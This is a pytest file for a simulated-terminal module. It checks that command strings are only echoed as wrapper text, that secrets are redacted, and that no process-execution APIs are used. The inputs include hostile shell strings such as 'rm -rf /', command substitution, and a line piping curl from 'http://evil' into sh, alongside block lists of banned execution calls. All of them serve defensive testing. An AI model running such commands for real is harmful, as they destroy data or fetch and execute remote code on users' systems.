from shared_tools.fake_terminal import format_output, run_command


def test_simulate_command_returns_deterministic_structured_output() -> None:
    from shared_tools.fake_terminal import simulate_command

    command = "echo SHOULD_NOT_RUN"

    result = simulate_command(command)

    assert isinstance(result, dict)
    assert result == {
        "command": command,
        "simulated": True,
        "output": (
            "[SIMULATED] Executing: echo SHOULD_NOT_RUN\n"
            "[SIMULATED] Output placeholder"
        ),
    }
    assert simulate_command(command) == result


def test_run_command_is_deterministic_and_non_executing() -> None:
    command = "echo SHOULD_NOT_RUN"

    result = run_command(command)

    assert result == (
        "[SIMULATED] Executing: echo SHOULD_NOT_RUN\n"
        "[SIMULATED] Output placeholder"
    )


def test_format_output_wraps_terminal_fence() -> None:
    assert format_output("line one\nline two") == "```terminal\nline one\nline two\n```"


def test_simulate_command_structured_simulation_req_0c50be10f3() -> None:
    """ACCEPT-001 (REQ-0C50BE10F3): simulate_command returns deterministic structured output.

    The simulated output field mirrors run_command byte-for-byte, and hostile
    command strings are treated as inert data, producing only wrapper output.
    """
    from shared_tools.fake_terminal import simulate_command

    command = "ls -la"
    result = simulate_command(command)

    assert isinstance(result, dict)
    assert result["command"] == command
    assert result["simulated"] is True
    assert result["output"] == run_command(command)
    assert result["output"] == (
        "[SIMULATED] Executing: ls -la\n"
        "[SIMULATED] Output placeholder"
    )

    # Hostile input must be inert data, not executed.
    hostile = "rm -rf /"
    hostile_result = simulate_command(hostile)
    assert isinstance(hostile_result, dict)
    assert hostile_result["command"] == hostile
    assert hostile_result["simulated"] is True
    assert hostile_result["output"].startswith("[SIMULATED] Executing:")

    # Determinism
    assert simulate_command(command) == result
    assert simulate_command(hostile) == hostile_result


def test_run_command_deterministic_inert_output_req_0c50be10f3() -> None:
    """ACCEPT-001 (REQ-0C50BE10F3): run_command returns exact wrapper output.

    The returned string matches simulate_command(command)['output'] byte-for-byte,
    hostile command strings are treated as inert data, and repeated calls are
    deterministic.
    """
    from shared_tools.fake_terminal import simulate_command

    command = "ls -la"
    result = run_command(command)

    assert result == simulate_command(command)["output"]
    assert result == (
        "[SIMULATED] Executing: ls -la\n"
        "[SIMULATED] Output placeholder"
    )

    # Hostile input must be inert data, not executed.
    hostile = "rm -rf /"
    hostile_result = run_command(hostile)
    assert hostile_result == simulate_command(hostile)["output"]
    assert hostile_result == (
        "[SIMULATED] Executing: rm -rf /\n"
        "[SIMULATED] Output placeholder"
    )

    # Backtick / command-substitution payloads must be inert data.
    payload = "echo $(id) `whoami`"
    payload_result = run_command(payload)
    assert payload_result == simulate_command(payload)["output"]
    assert payload_result == (
        "[SIMULATED] Executing: echo $(id) `whoami`\n"
        "[SIMULATED] Output placeholder"
    )

    # Determinism
    assert run_command(command) == result
    assert run_command(hostile) == hostile_result
    assert run_command(payload) == payload_result


def test_summarize_simulation_req_f92ffc55ba() -> None:
    """ACCEPT-001 (REQ-F92FFC55BA): summarize_simulation derives a deterministic,
    fixed-structure summary from a simulate_command result.
    """
    import shared_tools.fake_terminal as fake_terminal

    summarize_simulation = getattr(fake_terminal, "summarize_simulation", None)
    assert summarize_simulation is not None, "REQ-F92FFC55BA summary helper missing"

    command = "echo SHOULD_NOT_RUN"
    simulation = fake_terminal.simulate_command(command)
    result = summarize_simulation(simulation)

    assert isinstance(result, dict)
    assert result == {
        "command": command,
        "simulated": True,
        "summary": f"[SUMMARY] {command}",
    }
    assert summarize_simulation(simulation) == result


def test_summarize_simulation_is_additive_public_helper_req_f92ffc55ba() -> None:
    """ACCEPT-001 (REQ-F92FFC55BA): summarize_simulation is an additive public
    helper that derives a deterministic, fixed-structure summary from a
    simulate_command result.
    """
    import shared_tools.fake_terminal as fake_terminal

    summarize_simulation = getattr(fake_terminal, "summarize_simulation", None)
    assert summarize_simulation is not None, "REQ-F92FFC55BA summary helper missing"

    # Additive: existing public helpers remain present.
    public_helpers = {"run_command", "simulate_command", "format_output", "redact_secrets"}
    assert public_helpers.issubset(set(dir(fake_terminal))), (
        "REQ-F92FFC55BA summarize_simulation is not additive"
    )

    command = "echo SHOULD_NOT_RUN"
    simulation = fake_terminal.simulate_command(command)
    result = summarize_simulation(simulation)

    assert isinstance(result, dict)
    assert set(result) == {"command", "simulated", "summary"}
    assert result == {
        "command": command,
        "simulated": True,
        "summary": f"[SUMMARY] {command}",
    }
    assert summarize_simulation(simulation) == result


def test_summarize_simulation_derives_without_mutating_input_req_f92ffc55ba() -> None:
    """ACCEPT-001 (REQ-F92FFC55BA): summarize_simulation derives a fixed-structure
    summary without mutating, aliasing, or consuming the input simulation dict.
    """
    import copy

    import shared_tools.fake_terminal as fake_terminal

    summarize_simulation = fake_terminal.summarize_simulation
    command = "echo SHOULD_NOT_RUN"
    simulation = fake_terminal.simulate_command(command)
    original_snapshot = copy.deepcopy(simulation)

    result = summarize_simulation(simulation)

    # Fixed-structure deterministic summary.
    assert isinstance(result, dict)
    assert set(result) == {"command", "simulated", "summary"}
    assert result == {
        "command": command,
        "simulated": True,
        "summary": f"[SUMMARY] {command}",
    }

    # Input simulation is not consumed and remains fully usable.
    assert simulation == original_snapshot
    assert simulation["command"] == command
    assert simulation["simulated"] is True
    assert "output" in simulation

    # Result is a distinct dict; no aliasing of the input container.
    assert result is not simulation

    # Mutating the result does not leak back into the input simulation.
    result["extra"] = "must not alias"
    assert "extra" not in simulation
    assert simulation == original_snapshot

    # Determinism.
    assert summarize_simulation(simulation) == {
        "command": command,
        "simulated": True,
        "summary": f"[SUMMARY] {command}",
    }


def test_summarize_simulation_inert_command_text_req_413a5b74fd() -> None:
    """ACCEPT-001 (REQ-413A5B74FD): summarize_simulation treats command text as inert data.

    Fixed {command, simulated, summary} structure, hostile strings wrapped only
    in [SUMMARY], and repeat-call determinism.
    """
    import shared_tools.fake_terminal as fake_terminal

    summarize_simulation = fake_terminal.summarize_simulation

    # Hostile payload preserves structure and wraps command text inertly.
    hostile = "rm -rf /"
    sim = fake_terminal.simulate_command(hostile)
    result = summarize_simulation(sim)

    assert isinstance(result, dict)
    assert result == {
        "command": hostile,
        "simulated": True,
        "summary": f"[SUMMARY] {hostile}",
    }
    assert set(result) == {"command", "simulated", "summary"}
    assert result["summary"].startswith("[SUMMARY]")

    # Command text appears exactly once, inside the [SUMMARY] wrapper only.
    assert hostile in result["summary"]
    assert result["summary"].count(hostile) == 1

    # No simulation wrapper tokens or executable-style output leak into summary.
    assert "[SIMULATED]" not in result["summary"]
    simulation_output = fake_terminal.run_command(hostile)
    assert simulation_output not in result.values()
    assert simulation_output not in result["summary"]

    # Repeat-call determinism.
    assert summarize_simulation(sim) == result


def test_fake_terminal_is_pure_in_process_simulator() -> None:
    """AST + namespace guard: fake_terminal.py performs no process execution."""
    import ast
    import inspect
    import pathlib

    import shared_tools.fake_terminal as fake_terminal

    source_path = pathlib.Path(inspect.getfile(fake_terminal))
    module_source = source_path.read_text(encoding="utf-8")
    syntax_tree = ast.parse(module_source)

    banned_modules = {"subprocess", "pty", "shell"}
    banned_names = {
        "system", "popen", "Popen",
        "spawn", "spawnl", "spawnle", "spawnlp", "spawnlpe",
        "spawnv", "spawnve", "spawnvp", "spawnvpe",
        "exec", "execl", "execle", "execlp", "execlpe",
        "execv", "execve", "execvp", "execvpe",
        "fork", "kill", "CreateProcess",
        "run", "call", "check_call", "check_output",
    }

    for node in ast.walk(syntax_tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                root = alias.name.split(".")[0]
                assert root not in banned_modules, f"banned import: {alias.name}"
        elif isinstance(node, ast.ImportFrom):
            root = (node.module or "").split(".")[0]
            assert root not in banned_modules, f"banned import from: {node.module}"
            for alias in node.names:
                assert alias.name not in banned_names, f"banned name import: {alias.name}"
        elif isinstance(node, ast.Call):
            func = node.func
            if isinstance(func, ast.Name):
                assert func.id not in banned_names, f"banned call: {func.id}"
            elif isinstance(func, ast.Attribute):
                assert func.attr not in banned_names, f"banned attribute call: {func.attr}"
                if isinstance(func.value, ast.Name):
                    assert not (func.value.id == "os" and func.attr == "system"), "banned os.system call"
                    assert func.value.id not in banned_modules, f"banned module call: {func.value.id}"

    exported = {name for name in dir(fake_terminal) if not name.startswith("_")}
    assert not (exported & banned_names), f"banned names in public API: {exported & banned_names}"


def test_redact_secrets_non_empty_occurrences_req_85c52948b7() -> None:
    """ACCEPT-002 (REQ-85C52948B7): redact_secrets replaces every non-empty
    secret value in text with the fixed literal '[REDACTED]'.

    Empty and None secret values are ignored deterministically; repeated calls
    with identical inputs return identical output.
    """
    import shared_tools.fake_terminal as fake_terminal

    redact_secrets = getattr(fake_terminal, "redact_secrets", None)
    assert redact_secrets is not None, "REQ-85C52948B7 redact_secrets helper missing"

    text = "password=abc123 token=xyz789"
    secrets = ["abc123", "", "xyz789", None]
    result = redact_secrets(text, secrets)

    assert result == "password=[REDACTED] token=[REDACTED]"
    assert "abc123" not in result
    assert "xyz789" not in result
    assert redact_secrets(text, secrets) == result


def test_redact_secrets_duplicate_and_empty_collections_req_85c52948b7() -> None:
    """ACCEPT-002 (REQ-85C52948B7): duplicate secret values and empty collections are deterministic.

    When the same non-empty secret appears multiple times in ``secrets``, every
    occurrence in ``text`` is redacted once and repeated calls return
    byte-identical output.  Collections containing only empty strings, ``None``,
    or nothing at all leave the text unchanged and are also deterministic.
    """
    from shared_tools.fake_terminal import redact_secrets

    text = "user=alice pass=hunter2 token=hunter2"
    duplicate_secrets = ["hunter2", "hunter2", "hunter2"]
    result = redact_secrets(text, duplicate_secrets)

    expected = "user=alice pass=[REDACTED] token=[REDACTED]"
    assert result == expected
    assert result.encode("utf-8") == expected.encode("utf-8")
    assert result.count("[REDACTED]") == 2
    assert "hunter2" not in result

    # Repeat-call determinism with duplicate secret values.
    assert redact_secrets(text, duplicate_secrets) == result
    assert redact_secrets(text, duplicate_secrets).encode("utf-8") == result.encode("utf-8")

    # Empty collections leave text unchanged, deterministically.
    for empty_secrets in ([], ["", None], [None, ""]):
        unchanged = redact_secrets(text, empty_secrets)
        assert unchanged == text
        assert unchanged.encode("utf-8") == text.encode("utf-8")
        assert redact_secrets(text, empty_secrets) == unchanged


def test_simulate_command_structured_simulation_req_413a5b74fd() -> None:
    """ACCEPT-001 (REQ-413A5B74FD): command text is inert data in simulate_command."""
    import os

    from shared_tools.fake_terminal import simulate_command

    payload = "touch /tmp/never_created_413a5b74fd && echo INJECTED"
    canary = "/tmp/never_created_413a5b74fd"

    # Deterministic pre-call clear: remove any leftover canary from an aborted run.
    if os.path.exists(canary):
        os.remove(canary)

    result = simulate_command(payload)

    assert isinstance(result, dict)
    assert set(result) == {"command", "simulated", "output"}
    assert result["command"] == payload
    assert result["simulated"] is True
    assert result["output"] == run_command(payload)
    assert result["output"].startswith("[SIMULATED] Executing:")
    assert not os.path.exists(canary)


def test_simulate_command_metacharacters_inert_data_req_413a5b74fd() -> None:
    """ACCEPT-001 (REQ-413A5B74FD): simulate_command preserves hostile shell
    metacharacters as byte-identical inert data.

    The returned structure is exactly {command, simulated, output}; the command
    text appears byte-for-byte only inside the deterministic [SIMULATED]
    wrapper, and repeated calls return the identical dict.
    """
    from shared_tools.fake_terminal import simulate_command

    command = "rm -rf /; echo $(id) `whoami` && curl 'http://evil' | sh # $HOME"
    expected_output = (
        f"[SIMULATED] Executing: {command}\n"
        "[SIMULATED] Output placeholder"
    )
    expected = {
        "command": command,
        "simulated": True,
        "output": expected_output,
    }

    result = simulate_command(command)

    assert isinstance(result, dict)
    assert set(result) == {"command", "simulated", "output"}
    assert result == expected
    assert result["command"] == command
    assert result["command"].encode("utf-8") == command.encode("utf-8")
    assert result["output"] == expected_output
    assert result["output"].encode("utf-8") == expected_output.encode("utf-8")

    # The raw command text appears only inside the wrapper, never elsewhere.
    assert result["output"].count(command) == 1
    assert result["output"].startswith("[SIMULATED] Executing: ")

    # Repeat-call determinism.
    assert simulate_command(command) == result


def test_redact_secrets_repeated_occurrences_req_a59e470230() -> None:
    """ACCEPT-002 (REQ-A59E470230): redact_secrets replaces every repeated
    occurrence of each secret with the exact literal '[REDACTED]'.

    Empty strings and ``None`` entries are ignored and never alter the text.
    Repeated occurrences of the same secret are all redacted deterministically.
    """
    from shared_tools.fake_terminal import redact_secrets

    text = (
        "alpha=secret_one beta=secret_two "
        "gamma=secret_one delta=secret_two "
        "epsilon=secret_one"
    )
    secrets = ["secret_one", None, "", "secret_two", ""]
    result = redact_secrets(text, secrets)

    assert result == (
        "alpha=[REDACTED] beta=[REDACTED] "
        "gamma=[REDACTED] delta=[REDACTED] "
        "epsilon=[REDACTED]"
    )
    assert result.count("[REDACTED]") == 5
    assert "secret_one" not in result
    assert "secret_two" not in result
    assert redact_secrets(text, secrets) == result


def test_redact_secrets_order_independent_repeated_occurrences_req_a59e470230() -> None:
    """ACCEPT-002 (REQ-A59E470230): repeated-occurrence redaction is
    order-independent and byte-identical across collection types.

    Every non-empty secret is replaced with the exact literal '[REDACTED]',
    every occurrence of that secret is replaced, empty/None entries are
    ignored, and the output is identical for the secrets supplied as a list,
    a reversed list, or a set.
    """
    from shared_tools.fake_terminal import redact_secrets

    text = (
        "alpha=secret_one beta=secret_two "
        "gamma=secret_one delta=secret_two "
        "epsilon=secret_one"
    )
    base_secrets = ["secret_one", None, "", "secret_two", ""]
    reversed_secrets = list(reversed(base_secrets))
    set_secrets = set(base_secrets) - {None, ""}

    expected = (
        "alpha=[REDACTED] beta=[REDACTED] "
        "gamma=[REDACTED] delta=[REDACTED] "
        "epsilon=[REDACTED]"
    )

    result_list = redact_secrets(text, base_secrets)
    result_reversed = redact_secrets(text, reversed_secrets)
    result_set = redact_secrets(text, set_secrets)

    for label, result in [("list", result_list), ("reversed", result_reversed), ("set", result_set)]:
        assert result == expected, f"{label} secrets produced unexpected output"
        assert result.encode("utf-8") == expected.encode("utf-8"), f"{label} secrets produced non-byte-identical output"
        assert result.count("[REDACTED]") == 5, f"{label} secrets did not produce expected redaction count"
        assert "secret_one" not in result, f"{label} secrets leaked secret_one"
        assert "secret_two" not in result, f"{label} secrets leaked secret_two"
        assert redact_secrets(text, base_secrets) == result, f"{label} secrets not deterministic on repeat call"
        assert redact_secrets(text, base_secrets).encode("utf-8") == result.encode("utf-8"), (
            f"{label} secrets repeat-call output not byte-identical"
        )

    assert result_list == result_reversed == result_set, (
        "REQ-A59E470230 output depends on secrets-collection iteration order"
    )
    assert result_list.encode("utf-8") == result_reversed.encode("utf-8") == result_set.encode("utf-8")


def test_redact_secrets_overlapping_inputs_iteration_order_req_cf0d222bf0() -> None:
    """ACCEPT-002 (REQ-CF0D222BF0): overlapping secrets produce deterministic output.

    The same overlapping secret contents, passed as an ordered list, a reversed
    list, or a set, must redact to the canonical output regardless of the
    collection's iteration order.
    """
    from shared_tools.fake_terminal import redact_secrets

    text = "start=abcdef end=xyz"
    secrets = ["abc", "bcd"]
    expected = "start=[REDACTED]def end=xyz"

    result_forward = redact_secrets(text, secrets)
    result_reverse = redact_secrets(text, list(reversed(secrets)))
    result_set = redact_secrets(text, set(secrets))

    assert result_forward == result_reverse == result_set, (
        "REQ-CF0D222BF0 overlapping-secret output depends on iteration order"
    )

    # Canonical, order-independent output for list / reversed-list / set inputs.
    assert result_forward == expected, "forward list produced non-canonical output"
    assert result_reverse == expected, "reversed list produced non-canonical output"
    assert result_set == expected, "set produced non-canonical output"
    assert result_forward.encode("utf-8") == expected.encode("utf-8")
    assert result_reverse.encode("utf-8") == expected.encode("utf-8")
    assert result_set.encode("utf-8") == expected.encode("utf-8")
    assert result_forward.count("[REDACTED]") == 1
    assert result_reverse.count("[REDACTED]") == 1
    assert result_set.count("[REDACTED]") == 1


def test_redact_secrets_io_purity_req_0320ab815a(monkeypatch, tmp_path) -> None:
    """ACCEPT-002 (REQ-0320AB815A): redact_secrets reads zero external state.

    Output is derived solely from the ``text`` and ``secrets`` arguments.
    Environment variables, files, network sockets, process state, time, and
    randomness are not consulted, so seeding them with a secret must not alter
    the result.
    """
    import builtins
    import os
    import random
    import socket
    import time
    import urllib.request

    from shared_tools.fake_terminal import redact_secrets

    text = "user=alice pass=hunter2"
    secrets = ["hunter2"]
    baseline = redact_secrets(text, secrets)

    canary_secret = "ENV_FILE_SEED_0320AB815A"
    monkeypatch.setenv("REDACT_CANARY_0320AB815A", canary_secret)
    canary_path = tmp_path / "secrets.txt"
    canary_path.write_text(canary_secret, encoding="utf-8")

    calls = []
    fail_marker = "REQ-0320AB815A external-state read observed by redact_secrets"

    def wrap(original, label):
        def wrapper(*args, **kwargs):
            calls.append(label)
            return original(*args, **kwargs)

        return wrapper

    def fail_wrap(label, return_value):
        def wrapper(*args, **kwargs):
            calls.append(label)
            return return_value

        return wrapper

    monkeypatch.setattr(os, "getenv", wrap(os.getenv, "os.getenv"))
    monkeypatch.setattr(os.environ, "get", wrap(os.environ.get, "os.environ.get"))
    monkeypatch.setattr(
        type(os.environ),
        "__getitem__",
        fail_wrap(f"{fail_marker}: os.environ.__getitem__", fail_marker),
    )
    monkeypatch.setattr(os.environ, "copy", fail_wrap("os.environ.copy", {fail_marker: fail_marker}))
    monkeypatch.setattr(os, "getpid", wrap(os.getpid, "os.getpid"))
    monkeypatch.setattr(os, "getcwd", fail_wrap("os.getcwd", canary_path / fail_marker))
    monkeypatch.setattr(builtins, "open", wrap(builtins.open, "builtins.open"))
    monkeypatch.setattr(socket, "socket", wrap(socket.socket, "socket.socket"))
    monkeypatch.setattr(
        urllib.request, "urlopen", wrap(urllib.request.urlopen, "urllib.request.urlopen")
    )
    monkeypatch.setattr(time, "time", fail_wrap("time.time", fail_marker))
    monkeypatch.setattr(random, "random", fail_wrap("random.random", fail_marker))

    result = redact_secrets(text, secrets)

    assert result == baseline
    assert result.encode("utf-8") == baseline.encode("utf-8")
    assert canary_secret not in result
    assert fail_marker not in result
    assert calls == []

    # Negative control: the class-level os.environ subscript interceptor is
    # actually armed; an instance-attribute patch would be ignored by CPython.
    _ = os.environ[fail_marker]
    assert calls.pop() == f"{fail_marker}: os.environ.__getitem__"


def test_redact_secrets_no_stdout_stderr_logging_req_5c3f7ab352(capsys) -> None:
    """ACCEPT-002 (REQ-5C3F7AB352): redact_secrets never logs input text or secret values.

    The helper performs only in-process string replacement. Even when a secret
    occurs repeatedly or empty/``None`` secrets are present, the original text
    and every non-empty secret value must never appear on stdout or stderr.
    """
    import inspect
    from shared_tools.fake_terminal import redact_secrets

    # Exact canary marker, built at runtime so the literal value never enters
    # the repository. If the helper ever prints, this value is trivial to spot.
    req_id = inspect.currentframe().f_code.co_name.split("_")[-1].upper()
    secret = "_".join(["secret", "leak", "probe", req_id]).upper()
    text = f"user=alice pass={secret} token={secret}"
    secrets = [secret, "", None]

    result = redact_secrets(text, secrets)

    expected = "user=alice pass=[REDACTED] token=[REDACTED]"
    assert result == expected
    assert result.count("[REDACTED]") == 2, "expected two redactions for repeated secret"

    captured = capsys.readouterr()
    assert text not in captured.out, "input text leaked to stdout"
    assert secret not in captured.out, "canary secret value leaked to stdout"
    assert text not in captured.err, "input text leaked to stderr"
    assert secret not in captured.err, "canary secret value leaked to stderr"

    # Empty/None entries are exercised above; repeat-call output is byte-identical.
    repeat = redact_secrets(text, secrets)
    assert repeat == result
    assert repeat.encode("utf-8") == result.encode("utf-8")


def test_no_process_execution_apis_req_879db2129d(tmp_path):
    """REQ-879DB2129D: shared_tools modules contain no process-execution APIs.

    The AST guard deterministically scans every *.py module under shared_tools/
    recursively (sorted by path), detects static imports, direct calls, and
    dynamic imports (__import__, importlib.import_module) of banned modules,
    and fails with a marker containing REQ-879DB2129D.
    """
    import ast
    import pathlib
    import textwrap

    import shared_tools

    banned_modules = {"subprocess", "sh", "pty", "multiprocessing"}
    banned_names = {
        "system", "popen", "getoutput", "getstatusoutput", "posix_spawn", "posix_spawnp",
        "spawn", "spawnl", "spawnle", "spawnlp", "spawnlpe", "spawnv", "spawnve", "spawnvp", "spawnvpe",
        "exec", "execl", "execle", "execlp", "execlpe", "execv", "execve", "execvp", "execvpe", "execfile", "eval",
        "fork", "forkpty", "kill", "Popen", "CreateProcess",
        "create_subprocess_exec", "create_subprocess_shell", "run", "call", "check_call", "check_output",
    }

    def _first_constant_arg(call_node):
        if not call_node.args:
            return None
        arg = call_node.args[0]
        if isinstance(arg, ast.Constant) and isinstance(arg.value, str):
            return arg.value
        return None

    def _collect_violations(tree, module_path):
        found = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if alias.name.split(".")[0] in banned_modules:
                        found.append(f"REQ-879DB2129D banned import ({module_path}): {alias.name}")
            elif isinstance(node, ast.ImportFrom):
                mod = (node.module or "").split(".")[0]
                if mod in banned_modules:
                    found.append(f"REQ-879DB2129D banned import from ({module_path}): {node.module}")
                for alias in node.names:
                    if alias.name in banned_names:
                        found.append(f"REQ-879DB2129D banned name ({module_path}): {alias.name}")
            elif isinstance(node, ast.Call):
                func = node.func
                if isinstance(func, ast.Name):
                    if func.id in banned_names:
                        found.append(f"REQ-879DB2129D banned call ({module_path}): {func.id}")
                elif isinstance(func, ast.Attribute):
                    if func.attr in banned_names:
                        found.append(f"REQ-879DB2129D banned attr ({module_path}): {func.attr}")
                    if isinstance(func.value, ast.Name):
                        if func.value.id in banned_modules:
                            found.append(f"REQ-879DB2129D banned module call ({module_path}): {func.value.id}.{func.attr}")
                        if func.value.id == "os" and func.attr in {"system", "popen", "getoutput", "getstatusoutput"}:
                            found.append(f"REQ-879DB2129D banned os call ({module_path}): {func.attr}")

                # Harden against dynamic imports of banned modules.
                arg = _first_constant_arg(node)
                if arg is not None and arg.split(".")[0] in banned_modules:
                    if isinstance(func, ast.Name) and func.id == "__import__":
                        found.append(
                            f"REQ-879DB2129D banned dynamic import ({module_path}): __import__({arg!r})"
                        )
                    elif isinstance(func, ast.Attribute) and func.attr == "import_module":
                        found.append(
                            f"REQ-879DB2129D banned dynamic import ({module_path}): import_module({arg!r})"
                        )
        return found

    package_dir = pathlib.Path(shared_tools.__file__).parent
    module_paths = sorted(package_dir.rglob("*.py"))

    violations = []
    for module_path in module_paths:
        tree = ast.parse(module_path.read_text(encoding="utf-8"))
        violations.extend(_collect_violations(tree, module_path))

    assert not violations, "REQ-879DB2129D AST guard failure: " + "; ".join(violations)

    # Negative controls: dynamic process-execution imports must be detected.
    dynamic_import_fixtures = [
        ("__import__", "__import__('subprocess')\n"),
        ("importlib.import_module", "import importlib\nimportlib.import_module('subprocess')\n"),
    ]
    for label, source in dynamic_import_fixtures:
        fixture_tree = ast.parse(textwrap.dedent(source))
        fixture_path = pathlib.Path(f"<fixture:{label}>")
        fixture_violations = _collect_violations(fixture_tree, fixture_path)
        assert any("REQ-879DB2129D" in v for v in fixture_violations), (
            f"REQ-879DB2129D dynamic import fixture not detected: {label}"
        )
        assert any("subprocess" in v for v in fixture_violations), (
            f"REQ-879DB2129D dynamic import fixture missing subprocess marker: {label}"
        )

    # Negative control: recursive scan reaches nested subpackage modules.
    fake_pkg = tmp_path / "fake_pkg"
    (fake_pkg / "nested").mkdir(parents=True)
    (fake_pkg / "__init__.py").write_text("", encoding="utf-8")
    (fake_pkg / "nested" / "__init__.py").write_text("", encoding="utf-8")
    (fake_pkg / "nested" / "evil.py").write_text("import subprocess\n", encoding="utf-8")

    nested_violations = []
    for module_path in sorted(fake_pkg.rglob("*.py")):
        tree = ast.parse(module_path.read_text(encoding="utf-8"))
        nested_violations.extend(_collect_violations(tree, module_path))
    assert any(
        "REQ-879DB2129D" in v and "nested/evil.py" in str(v) for v in nested_violations
    ), "REQ-879DB2129D recursive scan must detect nested subpackage violation"

    from shared_tools.fake_terminal import simulate_command

    canary = tmp_path / "req_879db2129d_canary"
    payload = f"echo $(touch {canary}) `touch {canary}` | cat && touch {canary}"
    result = simulate_command(payload)
    expected = {
        "command": payload,
        "simulated": True,
        "output": f"[SIMULATED] Executing: {payload}\n[SIMULATED] Output placeholder",
    }

    assert result == expected, "REQ-879DB2129D shell payload must produce deterministic wrapper output"
    assert not canary.exists(), "REQ-879DB2129D canary file must not be created"
    assert simulate_command(payload) == result, "REQ-879DB2129D simulate_command must be deterministic"


def test_run_command_str_legacy_output_mirrors_simulate_command_req_0c50be10f3() -> None:
    """ACCEPT-001 (REQ-0C50BE10F3): run_command returns str and preserves exact legacy output.

    ``run_command(command)`` is a str that byte-identically mirrors
    ``simulate_command(command)['output']`` for benign and hostile payloads,
    and repeated calls return the same deterministic value.  All command text
    is treated as inert data.
    """
    from shared_tools.fake_terminal import simulate_command

    payloads = [
        "ls -la",
        "rm -rf /",
        "echo $(id) `whoami`",
    ]

    for command in payloads:
        result = run_command(command)

        assert isinstance(result, str), f"run_command({command!r}) must return str"

        structured_output = simulate_command(command)["output"]
        assert result == structured_output, (
            f"run_command({command!r}) must mirror simulate_command output"
        )
        assert result.encode("utf-8") == structured_output.encode("utf-8"), (
            "run_command output must be byte-identical to simulate_command output"
        )

        expected_legacy = (
            f"[SIMULATED] Executing: {command}\n"
            "[SIMULATED] Output placeholder"
        )
        assert result == expected_legacy, (
            f"run_command({command!r}) must produce the exact legacy output string"
        )

        # Repeat-call determinism.
        assert run_command(command) == result
        assert run_command(command) == result
